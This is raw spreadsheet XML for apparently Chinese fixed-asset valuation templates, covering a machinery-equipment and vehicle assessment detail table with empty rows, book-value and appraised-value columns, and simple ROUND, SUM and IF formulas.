      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="587" t="n"/>
      <c r="J20" s="587" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="380" t="n"/>
      <c r="O20" s="555">
        <f>ROUND(M20*N20/100,-1)</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>M20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>O20-L20</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(L20=0,"",ROUND(Q20/L20*100,2))</f>
        <v/>
      </c>
      <c r="S20" s="227" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="587" t="n"/>
      <c r="J21" s="587" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="380" t="n"/>
      <c r="O21" s="555">
        <f>ROUND(M21*N21/100,-1)</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>M21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>O21-L21</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(L21=0,"",ROUND(Q21/L21*100,2))</f>
        <v/>
      </c>
      <c r="S21" s="227" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="587" t="n"/>
      <c r="J22" s="587" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="380" t="n"/>
      <c r="O22" s="555">
        <f>ROUND(M22*N22/100,-1)</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>M22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>O22-L22</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(L22=0,"",ROUND(Q22/L22*100,2))</f>
        <v/>
      </c>
      <c r="S22" s="227" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="587" t="n"/>
      <c r="J23" s="587" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="380" t="n"/>
      <c r="O23" s="555">
        <f>ROUND(M23*N23/100,-1)</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>M23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>O23-L23</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(L23=0,"",ROUND(Q23/L23*100,2))</f>
        <v/>
      </c>
      <c r="S23" s="227" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="587" t="n"/>
      <c r="J24" s="587" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="380" t="n"/>
      <c r="O24" s="555">
        <f>ROUND(M24*N24/100,-1)</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>M24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>O24-L24</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(L24=0,"",ROUND(Q24/L24*100,2))</f>
        <v/>
      </c>
      <c r="S24" s="227" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="587" t="n"/>
      <c r="J25" s="587" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="380" t="n"/>
      <c r="O25" s="555">
        <f>ROUND(M25*N25/100,-1)</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>M25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>O25-L25</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(L25=0,"",ROUND(Q25/L25*100,2))</f>
        <v/>
      </c>
      <c r="S25" s="227" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="381" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="587" t="n"/>
      <c r="J26" s="587" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="380" t="n"/>
      <c r="O26" s="555">
        <f>ROUND(M26*N26/100,-1)</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>M26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>O26-L26</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(L26=0,"",ROUND(Q26/L26*100,2))</f>
        <v/>
      </c>
      <c r="S26" s="227" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="381" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="587" t="n"/>
      <c r="J27" s="587" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555" t="n"/>
      <c r="N27" s="380" t="n"/>
      <c r="O27" s="555">
        <f>ROUND(M27*N27/100,-1)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>M27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>O27-L27</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(L27=0,"",ROUND(Q27/L27*100,2))</f>
        <v/>
      </c>
      <c r="S27" s="227" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="381" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="587" t="n"/>
      <c r="J28" s="587" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="380" t="n"/>
      <c r="O28" s="555">
        <f>ROUND(M28*N28/100,-1)</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>M28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>O28-L28</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(L28=0,"",ROUND(Q28/L28*100,2))</f>
        <v/>
      </c>
      <c r="S28" s="227" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="381" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="587" t="n"/>
      <c r="J29" s="587" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="555" t="n"/>
      <c r="N29" s="380" t="n"/>
      <c r="O29" s="555">
        <f>ROUND(M29*N29/100,-1)</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>M29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>O29-L29</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(L29=0,"",ROUND(Q29/L29*100,2))</f>
        <v/>
      </c>
      <c r="S29" s="227" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="381" t="n"/>
      <c r="E30" s="380" t="n"/>
      <c r="F30" s="381" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="587" t="n"/>
      <c r="J30" s="587" t="n"/>
      <c r="K30" s="555" t="n"/>
      <c r="L30" s="555" t="n"/>
      <c r="M30" s="555" t="n"/>
      <c r="N30" s="380" t="n"/>
      <c r="O30" s="555">
        <f>ROUND(M30*N30/100,-1)</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>M30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>O30-L30</f>
        <v/>
      </c>
      <c r="R30" s="555">
        <f>IF(L30=0,"",ROUND(Q30/L30*100,2))</f>
        <v/>
      </c>
      <c r="S30" s="227" t="n"/>
    </row>
    <row r="31" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="381" t="n"/>
      <c r="D31" s="381" t="n"/>
      <c r="E31" s="380" t="n"/>
      <c r="F31" s="381" t="n"/>
      <c r="G31" s="380" t="n"/>
      <c r="H31" s="380" t="n"/>
      <c r="I31" s="587" t="n"/>
      <c r="J31" s="587" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="555" t="n"/>
      <c r="N31" s="380" t="n"/>
      <c r="O31" s="555">
        <f>ROUND(M31*N31/100,-1)</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>M31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>O31-L31</f>
        <v/>
      </c>
      <c r="R31" s="555">
        <f>IF(L31=0,"",ROUND(Q31/L31*100,2))</f>
        <v/>
      </c>
      <c r="S31" s="227" t="n"/>
    </row>
    <row r="32" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="115" t="n"/>
      <c r="H32" s="608">
        <f>SUM(H7:H31)</f>
        <v/>
      </c>
      <c r="I32" s="565" t="n"/>
      <c r="J32" s="565" t="n"/>
      <c r="K32" s="555">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="555">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="555">
        <f>SUM(M7:M31)</f>
        <v/>
      </c>
      <c r="N32" s="233" t="n"/>
      <c r="O32" s="580">
        <f>SUM(O7:O31)</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>M32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>O32-L32</f>
        <v/>
      </c>
      <c r="R32" s="555">
        <f>IF(L32=0,"",ROUND(Q32/L32*100,2))</f>
        <v/>
      </c>
      <c r="S32" s="231" t="n"/>
    </row>
    <row r="33" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：机器设备减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="565" t="n"/>
      <c r="I33" s="565" t="n"/>
      <c r="J33" s="565" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="555" t="n"/>
      <c r="N33" s="233" t="n"/>
      <c r="O33" s="580" t="n"/>
      <c r="P33" s="555">
        <f>M33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>O33-L33</f>
        <v/>
      </c>
      <c r="R33" s="555">
        <f>IF(L33=0,"",ROUND(Q33/L33*100,2))</f>
        <v/>
      </c>
      <c r="S33" s="227" t="n"/>
    </row>
    <row r="34" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="115" t="n"/>
      <c r="H34" s="608">
        <f>H32-H33</f>
        <v/>
      </c>
      <c r="I34" s="565" t="n"/>
      <c r="J34" s="565" t="n"/>
      <c r="K34" s="555">
        <f>K32-K33</f>
        <v/>
      </c>
      <c r="L34" s="555">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="555">
        <f>M32-M33</f>
        <v/>
      </c>
      <c r="N34" s="233" t="n"/>
      <c r="O34" s="580">
        <f>O32-O33</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>M34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>O34-L34</f>
        <v/>
      </c>
      <c r="R34" s="555">
        <f>IF(L34=0,"",ROUND(Q34/L34*100,2))</f>
        <v/>
      </c>
      <c r="S34" s="231" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="20">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="O3:S3"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="K5:L5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="J5:J6"/>
    <mergeCell ref="M5:O5"/>
    <mergeCell ref="P5:Q5"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:S34">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B5)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590277777777778" right="0.590277777777778" top="0.865972222222222" bottom="0.972222222222222" header="0.472222222222222" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="9" scale="71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 codeName="Sheet60">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A6" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="N7" sqref="N7:N34"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="14.6666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="11.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="6" customWidth="1" style="410" min="6" max="6"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col width="9.5" customWidth="1" style="410" min="10" max="10"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="16" max="17"/>
    <col outlineLevel="1" width="6.83333333333333" customWidth="1" style="410" min="18" max="18"/>
    <col width="5.5" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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固定资产—车辆评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="15" customFormat="1" customHeight="1" s="148">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="15" customFormat="1" customHeight="1" s="148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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="373" t="n"/>
      <c r="Q3" s="215" t="n"/>
      <c r="R3" s="215" t="n"/>
      <c r="S3" s="604" t="inlineStr">
        <is>
          <t>表4-8-5</t>
        </is>
      </c>
    </row>
    <row r="4" customFormat="1" s="148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54" t="n"/>
      <c r="G4" s="554" t="n"/>
      <c r="H4" s="554" t="n"/>
      <c r="I4" s="554" t="n"/>
      <c r="J4" s="554" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="376" t="n"/>
      <c r="P4" s="376" t="n"/>
      <c r="S4" s="217">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" customFormat="1" s="215">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="271" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="271" t="inlineStr">
        <is>
          <t>车辆牌号</t>
        </is>
      </c>
      <c r="D5" s="271" t="inlineStr">
        <is>
          <t>车辆名称
及规格型号</t>
        </is>
      </c>
      <c r="E5" s="271" t="inlineStr">
        <is>
          <t>生产厂家</t>
        </is>
      </c>
      <c r="F5" s="271" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="G5" s="271" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="H5" s="271" t="inlineStr">
        <is>
          <t>购置日期</t>
        </is>
      </c>
      <c r="I5" s="271" t="inlineStr">
        <is>
          <t>启用日期</t>
        </is>
      </c>
      <c r="J5" s="271" t="inlineStr">
        <is>
          <t>已行驶里程(公里)</t>
        </is>
      </c>
      <c r="K5" s="218" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="271" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N5" s="593" t="n"/>
      <c r="O5" s="567" t="n"/>
      <c r="P5" s="271" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q5" s="567" t="n"/>
      <c r="R5" s="221" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="S5" s="221" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" customFormat="1" s="215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222" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L6" s="271" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="M6" s="271" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="N6" s="271" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="O6" s="271" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="P6" s="271" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="Q6" s="271" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="271" t="n"/>
      <c r="C7" s="271" t="n"/>
      <c r="D7" s="271" t="n"/>
      <c r="E7" s="271" t="n"/>
      <c r="F7" s="271" t="n"/>
      <c r="G7" s="271" t="n"/>
      <c r="H7" s="609" t="n"/>
      <c r="I7" s="609" t="n"/>
      <c r="J7" s="610" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="380" t="n"/>
      <c r="O7" s="555">
        <f>ROUND(M7*N7/100,-2)</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>M7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>O7-L7</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(L7=0,"",ROUND(Q7/L7*100,2))</f>
        <v/>
      </c>
      <c r="S7" s="223" t="n"/>
    </row>
    <row r="8" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="271" t="n"/>
      <c r="C8" s="271" t="n"/>
      <c r="D8" s="271" t="n"/>
      <c r="E8" s="271" t="n"/>
      <c r="F8" s="271" t="n"/>
      <c r="G8" s="271" t="n"/>
      <c r="H8" s="609" t="n"/>
      <c r="I8" s="609" t="n"/>
      <c r="J8" s="610" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="380" t="n"/>
      <c r="O8" s="555">
        <f>ROUND(M8*N8/100,-2)</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>M8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>O8-L8</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(L8=0,"",ROUND(Q8/L8*100,2))</f>
        <v/>
      </c>
      <c r="S8" s="223" t="n"/>
    </row>
    <row r="9" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="271" t="n"/>
      <c r="C9" s="271" t="n"/>
      <c r="D9" s="271" t="n"/>
      <c r="E9" s="271" t="n"/>
      <c r="F9" s="271" t="n"/>
      <c r="G9" s="271" t="n"/>
      <c r="H9" s="609" t="n"/>
      <c r="I9" s="609" t="n"/>
      <c r="J9" s="610" t="n"/>
      <c r="K9" s="611" t="n"/>
      <c r="L9" s="611" t="n"/>
      <c r="M9" s="610" t="n"/>
      <c r="N9" s="380" t="n"/>
      <c r="O9" s="555">
        <f>ROUND(M9*N9/100,-2)</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>M9-K9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>O9-L9</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(L9=0,"",ROUND(Q9/L9*100,2))</f>
        <v/>
      </c>
      <c r="S9" s="223" t="n"/>
    </row>
    <row r="10" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="271" t="n"/>
      <c r="C10" s="271" t="n"/>
      <c r="D10" s="271" t="n"/>
      <c r="E10" s="271" t="n"/>
      <c r="F10" s="271" t="n"/>
      <c r="G10" s="271" t="n"/>
      <c r="H10" s="609" t="n"/>
      <c r="I10" s="609" t="n"/>
      <c r="J10" s="610" t="n"/>
      <c r="K10" s="611" t="n"/>
      <c r="L10" s="611" t="n"/>
      <c r="M10" s="610" t="n"/>
      <c r="N10" s="380" t="n"/>
      <c r="O10" s="555">
        <f>ROUND(M10*N10/100,-2)</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>M10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>O10-L10</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(L10=0,"",ROUND(Q10/L10*100,2))</f>
        <v/>
      </c>
      <c r="S10" s="223" t="n"/>
    </row>
    <row r="11" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="271" t="n"/>
      <c r="C11" s="271" t="n"/>
      <c r="D11" s="271" t="n"/>
      <c r="E11" s="271" t="n"/>
      <c r="F11" s="271" t="n"/>
      <c r="G11" s="271" t="n"/>
      <c r="H11" s="609" t="n"/>
      <c r="I11" s="609" t="n"/>
      <c r="J11" s="610" t="n"/>
      <c r="K11" s="611" t="n"/>
      <c r="L11" s="611" t="n"/>
      <c r="M11" s="610" t="n"/>
      <c r="N11" s="380" t="n"/>
      <c r="O11" s="555">
        <f>ROUND(M11*N11/100,-2)</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>M11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>O11-L11</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(L11=0,"",ROUND(Q11/L11*100,2))</f>
        <v/>
      </c>
      <c r="S11" s="223" t="n"/>
    </row>
    <row r="12" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="271" t="n"/>
      <c r="C12" s="271" t="n"/>
      <c r="D12" s="271" t="n"/>
      <c r="E12" s="271" t="n"/>
      <c r="F12" s="271" t="n"/>
      <c r="G12" s="271" t="n"/>
      <c r="H12" s="609" t="n"/>
      <c r="I12" s="609" t="n"/>
      <c r="J12" s="610" t="n"/>
      <c r="K12" s="611" t="n"/>
      <c r="L12" s="611" t="n"/>
      <c r="M12" s="610" t="n"/>
      <c r="N12" s="380" t="n"/>
      <c r="O12" s="555">
        <f>ROUND(M12*N12/100,-2)</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>M12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>O12-L12</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(L12=0,"",ROUND(Q12/L12*100,2))</f>
        <v/>
      </c>
      <c r="S12" s="223" t="n"/>
    </row>
    <row r="13" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="271" t="n"/>
      <c r="C13" s="271" t="n"/>
      <c r="D13" s="271" t="n"/>
      <c r="E13" s="271" t="n"/>
      <c r="F13" s="271" t="n"/>
      <c r="G13" s="271" t="n"/>
      <c r="H13" s="609" t="n"/>
      <c r="I13" s="609" t="n"/>
      <c r="J13" s="610" t="n"/>
      <c r="K13" s="611" t="n"/>
      <c r="L13" s="611" t="n"/>
      <c r="M13" s="610" t="n"/>
      <c r="N13" s="380" t="n"/>
      <c r="O13" s="555">
        <f>ROUND(M13*N13/100,-2)</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>M13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>O13-L13</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(L13=0,"",ROUND(Q13/L13*100,2))</f>
        <v/>
      </c>
      <c r="S13" s="223" t="n"/>
    </row>
    <row r="14" ht="17.25" customFormat="1" customHeight="1" s="215">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="271" t="n"/>
      <c r="C14" s="271" t="n"/>
      <c r="D14" s="271" t="n"/>
      <c r="E14" s="271" t="n"/>
      <c r="F14" s="271" t="n"/>
      <c r="G14" s="271" t="n"/>
      <c r="H14" s="609" t="n"/>
      <c r="I14" s="609" t="n"/>
      <c r="J14" s="610" t="n"/>
      <c r="K14" s="611" t="n"/>
      <c r="L14" s="611" t="n"/>
      <c r="M14" s="610" t="n"/>
      <c r="N14" s="380" t="n"/>
      <c r="O14" s="555">
        <f>ROUND(M14*N14/100,-2)</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>M14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>O14-L14</f>
        <v/>
      </c>
      <c r="R14" s="555">
